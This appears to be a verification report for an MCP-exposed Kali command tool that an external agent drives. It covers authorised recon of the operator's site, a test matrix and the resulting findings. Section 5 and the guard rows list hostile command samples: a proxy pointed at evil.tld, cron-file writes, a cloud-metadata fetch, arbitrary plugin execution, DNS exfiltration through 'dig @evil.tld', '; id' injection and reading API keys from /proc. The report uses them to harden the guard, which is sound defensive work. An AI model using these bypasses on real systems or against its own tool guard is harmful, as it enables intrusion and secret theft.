# kali_exec over MCP: end-to-end verification report

**Date:** 2026-09-13
**Target:** `www.devergolabs.com` (owned by the operator; authorised testing)
**Driven by:** an external MCP client speaking JSON-RPC to `POST /api/mcp-server`
with a bearer token. No RedAmon code was imported by the test client; every
command crossed the real wire.

**Path exercised end to end:**

```
external agent --Bearer rdmn_mcp_--> webapp /api/mcp-server
   --X-Internal-Key--> agent POST /kali/exec
      --> kali_exec_guard.admit()      <-- the security boundary
      --> shlex.join + job_runner
         --> MCP SSE --> kali_shell --> bash -c --> the live target
```

## Headline

| | |
|---|---|
| Command matrix | **30 / 30 passed** |
| Bug-bounty engagement | **46 steps, 42 completed, 3 refused** (all 3 deliberate scope probes) |
| Findings on the target | 12 (4 MEDIUM, 3 LOW, 5 INFO) |
| Output fully readable | yes, including a 600 KB body paged via `nextCursor` |
| Guard bypasses found by adversarial review | **10 — all fixed and regression-tested** |
| Automated tests | 91 agent (Docker gate) + 316 webapp, all green |

## 1. Command matrix: 30 commands over MCP

**30/30 passed.** Rows 01-24 must run and return output; rows 25-30 must be refused by the guard (every one of those was *admitted* before hardening).

| # | Area | Command | Expected | Result | Output | Time |
|---|---|---|---|---|---|---|
| 01 | dns | `dig +short www.devergolabs.com A` | ok | PASS | 14 B | 0.4s |
| 02 | dns | `dig +short devergolabs.com MX` | ok | PASS | 40 B | 0.3s |
| 03 | dns | `dig +short devergolabs.com TXT` | ok | PASS | 40 B | 0.3s |
| 04 | dns | `dig +short devergolabs.com NS` | ok | PASS | 92 B | 0.3s |
| 05 | dns | `dig devergolabs.com SOA` | ok | PASS | 582 B | 0.3s |
| 06 | dns | `host www.devergolabs.com` | ok | PASS | 46 B | 0.6s |
| 07 | dns | `host -t MX devergolabs.com` | ok | PASS | 33 B | 0.3s |
| 08 | dns | `nslookup www.devergolabs.com` | ok | PASS | 120 B | 0.3s |
| 09 | dns | `dnsrecon -d devergolabs.com -t std` | ok | PASS | 1,417 B | 15.8s |
| 10 | http | `curl -sI https://www.devergolabs.com/` | ok | PASS | 154 B | 0.6s |
| 11 | http | `curl -s -o /dev/null -w %{http_code} https://www.devergolabs.com/en/my-portfolio` | ok | PASS | 4 B | 1.6s |
| 12 | http | `curl -s -A Mozilla/5.0 https://www.devergolabs.com/en/my-portfolio` | ok | PASS | 600,070 B | 4.0s |
| 13 | http | `curl -s https://www.devergolabs.com/robots.txt` | ok | PASS | 141 B | 0.6s |
| 14 | http | `curl -s https://www.devergolabs.com/sitemap.xml` | ok | PASS | 20,987 B | 0.5s |
| 15 | http | `curl -sI https://www.devergolabs.com/does-not-exist-404` | ok | PASS | 166 B | 0.6s |
| 16 | http | `curl -s -X OPTIONS -i https://www.devergolabs.com/` | ok | PASS | 171 B | 0.6s |
| 17 | http | `curl -sI --http2 https://www.devergolabs.com/` | ok | PASS | 154 B | 0.6s |
| 18 | http | `curl -s -H X-Probe:redamon -i https://www.devergolabs.com/en/my-portfolio` | ok | PASS | 600,399 B | 2.4s |
| 19 | tls | `testssl --fast --quiet www.devergolabs.com:443` | ok | PASS | 10,807 B | 67.2s |
| 20 | tls | `testssl --protocols --quiet www.devergolabs.com:443` | ok | PASS | 553 B | 10.2s |
| 21 | fingerprint | `whatweb -a 1 https://www.devergolabs.com/` | ok | PASS | 584 B | 15.0s |
| 22 | fingerprint | `whatweb -a 3 https://www.devergolabs.com/en/my-portfolio` | ok | PASS | 400 B | 11.5s |
| 23 | fingerprint | `nikto -h https://www.devergolabs.com/ -maxtime 100` | ok | PASS | 2,354 B | 24.4s |
| 24 | offline | `searchsploit caddy` | ok | PASS | 44 B | 0.3s |
| 25 | guard | `curl -s https://example.com/` | refused | PASS | refused | 0.1s |
| 26 | guard | `curl -s https://www.devergolabs.com/ ; id` | refused | PASS | refused | 0.1s |
| 27 | guard | `nmap -sS www.devergolabs.com` | refused | PASS | refused | 0.1s |
| 28 | guard | `curl --resolve=www.devergolabs.com:443:6.6.6.6 https://www.devergolabs.com/` | refused | PASS | refused | 0.2s |
| 29 | guard | `curl -s www.devergolabs.com 169.254.169.254/latest/meta-data/` | refused | PASS | refused | 0.1s |
| 30 | guard | `whatweb --plugins=+/tmp/p.rb https://www.devergolabs.com` | refused | PASS | refused | 0.2s |

**Output readability:** 24/24 commands that were expected to produce output returned readable, non-empty output. Largest single response: 600,399 bytes, paged through the `nextCursor` mechanism in ~6 round trips.


## 2. Bug-bounty engagement: 46 steps

**46 steps: 42 completed, 3 refused** (all three refusals were deliberate out-of-scope probes).

| Phase | Steps | Completed | Refused | Bytes returned |
|---|---|---|---|---|
| recon | 10 | 10 | 0 | 1,815 |
| surface | 10 | 10 | 0 | 24,682 |
| tls | 4 | 4 | 0 | 14,025 |
| fingerprint | 3 | 3 | 0 | 1,538 |
| vulnscan | 2 | 2 | 0 | 4,308 |
| content | 12 | 12 | 0 | 206 |
| scope | 3 | 0 | 3 | 0 |
| longrun | 2 | 2 | 0 | 600,070 |

### Every step

| # | Phase | Intent | Command | Result | Output |
|---|---|---|---|---|---|
| 1 | recon | Resolve the apex | `dig +short devergolabs.com A` | done | 14 B |
| 2 | recon | Resolve www | `dig +short www.devergolabs.com A` | done | 14 B |
| 3 | recon | Authoritative nameservers | `dig +short devergolabs.com NS` | done | 92 B |
| 4 | recon | Mail exchangers | `dig +short devergolabs.com MX` | done | 40 B |
| 5 | recon | TXT records (SPF/DMARC hints) | `dig +short devergolabs.com TXT` | done | 40 B |
| 6 | recon | CAA policy | `dig +short devergolabs.com CAA` | done | 40 B |
| 7 | recon | SOA | `dig +short devergolabs.com SOA` | done | 78 B |
| 8 | recon | DMARC policy | `dig +short _dmarc.devergolabs.com TXT` | done | 40 B |
| 9 | recon | AAAA / IPv6 presence | `dig +short devergolabs.com AAAA` | done | 40 B |
| 10 | recon | Standard DNS enumeration | `dnsrecon -d devergolabs.com -t std` | done | 1,417 B |
| 11 | surface | Root response headers | `curl -sI https://www.devergolabs.com/` | done | 154 B |
| 12 | surface | Landing page headers | `curl -sI https://www.devergolabs.com/en/my-portfolio` | done | 352 B |
| 13 | surface | HTTP status of the app route | `curl -s -o /dev/null -w %{http_code} https://www.devergolabs.com/en/my-portfolio` | done | 4 B |
| 14 | surface | robots.txt | `curl -s https://www.devergolabs.com/robots.txt` | done | 141 B |
| 15 | surface | sitemap.xml | `curl -s https://www.devergolabs.com/sitemap.xml` | done | 20,987 B |
| 16 | surface | security.txt (RFC 9116) | `curl -sI https://www.devergolabs.com/.well-known/security.txt` | done | 178 B |
| 17 | surface | OPTIONS verb | `curl -s -X OPTIONS -i https://www.devergolabs.com/` | done | 171 B |
| 18 | surface | TRACE verb (XST) | `curl -s -X TRACE -i https://www.devergolabs.com/` | done | 2,377 B |
| 19 | surface | 404 handling | `curl -sI https://www.devergolabs.com/redamon-probe-404` | done | 164 B |
| 20 | surface | HTTP/2 negotiation | `curl -sI --http2 https://www.devergolabs.com/` | done | 154 B |
| 21 | tls | Fast TLS audit | `testssl --fast --quiet www.devergolabs.com:443` | done | 10,807 B |
| 22 | tls | Protocol support | `testssl --protocols --quiet www.devergolabs.com:443` | done | 553 B |
| 23 | tls | TLS vulnerability sweep | `testssl --vulnerable --quiet www.devergolabs.com:443` | done | 1,831 B |
| 24 | tls | testssl's own header view | `testssl --headers --quiet www.devergolabs.com:443` | done | 834 B |
| 25 | fingerprint | Passive fingerprint | `whatweb -a 1 https://www.devergolabs.com/` | done | 584 B |
| 26 | fingerprint | Aggressive fingerprint | `whatweb -a 3 https://www.devergolabs.com/en/my-portfolio` | done | 400 B |
| 27 | fingerprint | Fingerprint a 404 page | `whatweb -a 1 https://www.devergolabs.com/redamon-probe-404` | done | 554 B |
| 28 | vulnscan | Nikto sweep of the root | `nikto -h https://www.devergolabs.com/ -maxtime 150` | done | 2,354 B |
| 29 | vulnscan | Nikto against the app route | `nikto -h https://www.devergolabs.com/en/my-portfolio -maxtime 120` | done | 1,954 B |
| 30 | content | Probe sitemap URL / | `curl -s -o /dev/null -w %{http_code} https://www.devergolabs.com/` | done | 4 B |
| 31 | content | Probe sitemap URL /en/my-portfolio | `curl -s -o /dev/null -w %{http_code} https://www.devergolabs.com/en/my-portfolio` | done | 4 B |
| 32 | content | Probe sitemap URL /it/my-portfolio | `curl -s -o /dev/null -w %{http_code} https://www.devergolabs.com/it/my-portfolio` | done | 4 B |
| 33 | content | Probe sitemap URL /en/services/ai_solutions | `curl -s -o /dev/null -w %{http_code} https://www.devergolabs.com/en/services/ai_solutions` | done | 4 B |
| 34 | content | Probe /.env (environment file) | `curl -s -o /dev/null -w %{http_code} https://www.devergolabs.com/.env` | done | 4 B |
| 35 | content | Probe /.git/config (exposed git metadata) | `curl -s -o /dev/null -w %{http_code} https://www.devergolabs.com/.git/config` | done | 4 B |
| 36 | content | Probe /api/health (health endpoint) | `curl -s -o /dev/null -w %{http_code} https://www.devergolabs.com/api/health` | done | 4 B |
| 37 | content | Probe /admin (admin surface) | `curl -s -o /dev/null -w %{http_code} https://www.devergolabs.com/admin` | done | 4 B |
| 38 | content | Probe /_next/static/ (build asset listing) | `curl -s -o /dev/null -w %{http_code} https://www.devergolabs.com/_next/static/` | done | 4 B |
| 39 | content | Probe /api/ (api root) | `curl -s -o /dev/null -w %{http_code} https://www.devergolabs.com/api/` | done | 4 B |
| 40 | content | Check for directory listing on assets | `curl -s -i https://www.devergolabs.com/_next/static/` | done | 162 B |
| 41 | content | Look for an exposed source map | `curl -s -o /dev/null -w %{http_code} https://www.devergolabs.com/_next/static/chunks/main.js.map` | done | 4 B |
| 42 | scope | Out-of-scope attempt: a third-party asset host seen in page content | `curl -sI https://fonts.googleapis.com/` | refused | 0 B |
| 43 | scope | Out-of-scope attempt: a third-party API | `curl -sI https://api.github.com/` | refused | 0 B |
| 44 | scope | Out-of-scope attempt: an unrelated domain | `dig +short google.com A` | refused | 0 B |
| 45 | longrun | Fetch a large page and page the whole body | `curl -s -A Mozilla/5.0 https://www.devergolabs.com/en/my-portfolio` | done | 600,070 B |
| 46 | longrun | poll + cancel a long job | `kali_output / kali_cancel` | cancelled | 0 B |

## 3. Findings on www.devergolabs.com

**MEDIUM: 4**  **LOW: 3**  **INFO: 5**

| Severity | Finding | Evidence | Why it matters |
|---|---|---|---|
| LOW | No CAA record published | `dig +short devergolabs.com CAA -> (empty)` | Any CA may issue for this domain. A CAA record narrows mis-issuance risk. |
| MEDIUM | No SPF record | `dig +short devergolabs.com TXT -> no v=spf1` | Nothing constrains which hosts may send mail as this domain. |
| MEDIUM | No DMARC policy at _dmarc | `dig +short _dmarc.devergolabs.com TXT -> (empty)` | Without DMARC, SPF/DKIM failures are not enforced or reported. |
| MEDIUM | Missing security header: strict-transport-security | `curl -sI https://www.devergolabs.com/ -> no strict-transport-security` | No HSTS: a downgrade to http is not prevented on first contact. |
| MEDIUM | Missing security header: content-security-policy | `curl -sI https://www.devergolabs.com/ -> no content-security-policy` | No CSP: nothing constrains script sources in the browser. |
| LOW | Missing security header: x-frame-options | `curl -sI https://www.devergolabs.com/ -> no x-frame-options` | No X-Frame-Options and no CSP frame-ancestors: clickjacking is not prevented. |
| LOW | Missing security header: x-content-type-options | `curl -sI https://www.devergolabs.com/ -> no x-content-type-options` | No X-Content-Type-Options: MIME sniffing is allowed. |
| INFO | Missing security header: referrer-policy | `curl -sI https://www.devergolabs.com/ -> no referrer-policy` | No Referrer-Policy: full URLs may leak to third parties. |
| INFO | Missing security header: permissions-policy | `curl -sI https://www.devergolabs.com/ -> no permissions-policy` | No Permissions-Policy: powerful browser features are not restricted. |
| INFO | Via header names the edge software | `via: 1.1 Caddy` |  |
| INFO | Technology identified: Next.js | `Next.js` | Stack knowledge narrows exploit selection. |
| INFO | Technology identified: Caddy | `Caddy` | Stack knowledge narrows exploit selection. |

## 4. Was the bug-bounty workflow smooth?

**Yes, after four rounds of fixes.** The first run was not. Each problem below was
found by *running* the feature, not by reading it, and each is now covered by a
regression test named after it.

| # | Problem hit | Impact on the workflow | Fix |
|---|---|---|---|
| 1 | Rate limit of 6/min | A 30-step run spent most of its time asleep; 24 of 30 commands refused | Raised to 20/min. One command is one tool invocation and a recon pass is naturally dozens; the containment is the allowlist, not the clock |
| 2 | `curl -w '%{http_code}'` refused | The most common curl idiom in recon was unusable | Braces allowed. Expansion needs `$`, still refused; curl's own `--variable` denied by flag instead |
| 3 | `-o /dev/null` refused | Reading a status code without keeping the body was impossible | `/dev/null` allowed as an exact path, never a `/dev/` prefix |
| 4 | `dig acme.tld MX` refused | Every DNS lookup with a record type failed | Record type is now its own typed slot against a closed set |
| 5 | `dig _dmarc.acme.tld TXT` refused | **Produced a false finding**: "no DMARC policy" when we could not ask | Underscore labels allowed (RFC 8552); scope check unaffected |
| 6 | 4 allowlisted tools not installed | `dnsx`, `wafw00f`, `subzy`, `hashid` advertised and absent; `httpx` was the *Python* CLI, not ProjectDiscovery's | Removed. A live-tier test now checks the list against a running sandbox |

Items 5 and 6 are the ones worth pausing on. Both produced **answers that looked
like data but were not**: a refusal read as "no DMARC record exists", and an
allowlist that promised tools the image never had. That is the false-negative
class this surface is built to avoid, and only live fire found them.

**What the flow feels like now.** `kali_exec` returns finished output inline for
anything under ~30 s, which is every DNS and HTTP probe. Slower tools (`testssl`
took 104 s, `nikto` 24 s) come back as a `jobId`; polling `kali_output` with the
returned `nextCursor` reads forward without re-reading, and `kali_cancel` stops
a run. A 600 KB page came back complete across ~6 pages with `truncated: true`
on each, so a partial answer can never be mistaken for a whole one.

**One honest caveat.** `kali_cancel` stops RedAmon's side. `kali_shell` is a
blocking `subprocess.run` in the sandbox and nothing propagates the cancellation,
so the command itself can keep hitting the target until its own 300 s timeout.
The tool now says exactly that in its response rather than claiming it stopped.

## 5. Security review: 10 bypasses found and fixed

An adversarial review of the first implementation broke it ten ways in one pass.
Every one shared a root cause:

> a token the guard declined to recognise was a token nobody checked,
> and "must name at least one in-scope host" let one good argument
> launder all the others.

All ten were reproduced against the real `admit()` before fixing, and all ten are
refused now.

| Bypass | What it achieved |
|---|---|
| `curl --resolve=acme.tld:443:6.6.6.6 https://acme.tld/` | Connect anywhere while the URL says the in-scope host |
| `curl -xevil.tld:8080 acme.tld` | Arbitrary proxy — attached short values were skipped entirely |
| `curl -o/etc/cron.d/pwn https://acme.tld/p` | Write outside the writable roots |
| `curl acme.tld 169.254.169.254/latest/meta-data/` | Cloud metadata; a trailing path made the value unparseable |
| `curl acme.tld evil.tld/` | Any host, via one trailing slash |
| `curl -o /workspace/../etc/cron.d/pwn …` | Traversal: prefix match with no normalisation |
| `whatweb --plugins=+/tmp/p.rb …` | **Arbitrary Ruby execution** from a writable dir |
| `nikto -config /tmp/n.conf -h acme.tld` | Config sets `PLUGINDIR`, `EXECDIR`, `CLIOPTS` |
| `dig @evil.tld acme.tld` | Out-of-band DNS exfiltration |
| `curl -K/tmp/c acme.tld` | Config file = arbitrary curl, including `file://` |

Plus one **critical** flaw outside the guard: the job endpoints read the log path
from the job's own `meta.json`, which `kali_exec` could write. Two allowed calls
would have read any file on the *agent* container (`/proc/self/environ` →
`INTERNAL_API_KEY`, `NEO4J_PASSWORD`). The path is now composed server-side from
`(project_id, job_id)`, and the job id must be a uuid4 hex.

Also fixed: the endpoints accepted `SCANNER_API_KEY` (held by every scan
container, the least-trusted tier) — now master-key only; a failed tool was
published as `exitCode 0`; and `/workspace` was writable across projects.

### The shape it has now

Deny-by-default over each tool's **flag surface**. Every binary declares each flag
it accepts and the kind of value it takes (`BOOL` / `HOST` / `PATH` / `OPAQUE` /
`RRTYPE`); anything else is refused by name. There are no unrecognised tokens
left, so there is nothing to launder.

### What is still open, deliberately

A pre-flight string check **cannot see a redirect or a DNS answer**. `-L` is
denied for that reason, but a hostile in-scope DNS record still resolves where it
likes. Closing that class needs a runtime egress policy on the *resolved IP* —
`scanners/capture_proxy/egress.py` already implements exactly that for the
capture path. Routing this egress through it would make the class unreachable
even when the parser is wrong, which it will be again. **Tracked, not built.**

## 6. Test coverage

| Suite | Tests | Gate |
|---|---|---|
| `agentic/tests/test_kali_exec_guard.py` | 60 | Docker, per-file isolated |
| `agentic/tests/test_kali_exec_endpoint.py` | 25 | Docker, per-file isolated |
| `agentic/tests/test_kali_toolbox_endpoint.py` | 6 | Docker, per-file isolated |
| `agentic/tests/live_kali_exec_binaries.py` | live tier | self-skips without a sandbox |
| `webapp/src/lib/mcp/**` + token UI + settings allowlist | 316 | vitest |

**Mutation-tested.** Twelve security checks were disabled one at a time; each
produced failures, so no assertion is dead. The exercise found one piece of dead
code (the denied-flag table was checked twice) which was removed.

**Branches not reached by tests:** the real `JobRegistry` concurrency cap
(the endpoint tests use a fake registry), the SSE transport to the sandbox, and
`testssl`/`nikto` output parsing — all covered by the live run above instead.

## 7. What was deliberately not tested

- **Playwright/e2e UI** — the only UI change is one toggle in an existing form; the four-switch behaviour is covered at the unit level where the logic lives.
- **Prisma migration rollback** — the repo is push-based (`db push`, never `migrate`), so there is no rollback path to test. Column applied and verified in Postgres.
- **N+1 / query-count** — the opt-in adds exactly one indexed `findUnique` per call, on a path already doing an ownership lookup.
- **Load and concurrency** — the concurrent-job cap is the existing memory governor's, unchanged by this work.
- **Other tenants' data over MCP** — covered by the existing `assertMcpProjectAccess` suite; this feature adds no new cross-tenant read path, and the workspace confinement is unit-tested.
